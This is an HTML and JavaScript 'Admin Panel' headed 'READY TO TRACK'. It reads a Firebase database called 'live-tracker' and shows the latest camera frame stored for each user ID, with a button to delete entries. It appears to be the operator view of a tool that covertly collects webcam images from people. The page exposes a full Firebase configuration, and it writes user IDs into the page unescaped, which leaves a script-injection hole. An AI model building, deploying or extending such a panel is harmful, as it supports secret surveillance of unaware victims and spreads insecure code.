<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>

<style>
body{
  margin:0;
  font-family:Arial;
  background:#0b1220;
  color:white;
}

/* HEADER */
header{
  padding:15px;
  text-align:center;
  background:#0f172a;
  color:#00ff9d;
  font-weight:bold;
  letter-spacing:2px;
  border-bottom:1px solid #00ff9d33;
}

/* MAIN CONTAINER */
.container{
  display:flex;
  flex-direction:column;
  gap:15px;
  padding:15px;
}

/* USER BOX */
.userBox{
  background:#1e293b;
  padding:15px;
  border-radius:12px;
  box-shadow:0 0 10px rgba(0,255,157,0.1);
}

/* IMAGE WRAPPER (IMPORTANT FOR FULL IMAGE) */
.imgBox{
  width:100%;
  max-height:400px;
  display:flex;
  justify-content:center;
  align-items:center;
  margin-top:10px;
  background:#0f172a;
  border-radius:10px;
  overflow:hidden;
}

/* IMAGE FIX */
.imgBox img{
  width:100%;
  height:auto;          /* 🔥 full image show */
  max-height:400px;
  object-fit:contain;   /* 🔥 NO CUT, NO STRETCH */
  border-radius:10px;
}

/* BUTTON */
button{
  margin-top:10px;
  padding:8px 12px;
  border:none;
  border-radius:8px;
  cursor:pointer;
  background:#ef4444;
  color:white;
  font-weight:bold;
}
</style>
</head>

<body>

<header>📡 READY TO TRACK</header>

<div class="container" id="grid"></div>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const grid = document.getElementById("grid");

/* LOAD USERS */
db.ref("camera").on("value",(snap)=>{

  const data = snap.val();
  grid.innerHTML="";

  if(!data){
    grid.innerHTML="<p>No Users Found</p>";
    return;
  }

  Object.keys(data).forEach(userId=>{

    const box = document.createElement("div");
    box.className = "userBox";

    box.innerHTML = `
      <h3>👤 ${userId}</h3>

      <div class="imgBox">
        <img id="img_${userId}" src="" />
      </div>

      <button onclick="deleteUser('${userId}')">
        DELETE USER
      </button>
    `;

    grid.appendChild(box);

    loadImage(userId);

  });

});

/* LOAD LATEST IMAGE */
function loadImage(userId){

  const ref = db.ref("camera/" + userId);

  ref.on("value",(snap)=>{

    const data = snap.val();
    const img = document.getElementById("img_" + userId);

    if(!data){
      img.src = "https://via.placeholder.com/600x400?text=No+Image";
      return;
    }

    // latest image
    const lastItem = data.frame;

    img.src = lastItem || "https://via.placeholder.com/600x400?text=No+Image";

  });

}

/* DELETE USER */
function deleteUser(userId){

  if(confirm("Delete this user?")){

    db.ref("camera/" + userId).remove()
    .then(()=>alert("Deleted"))
    .catch(err=>alert(err.message));

  }

}
</script>

</body>
</html>
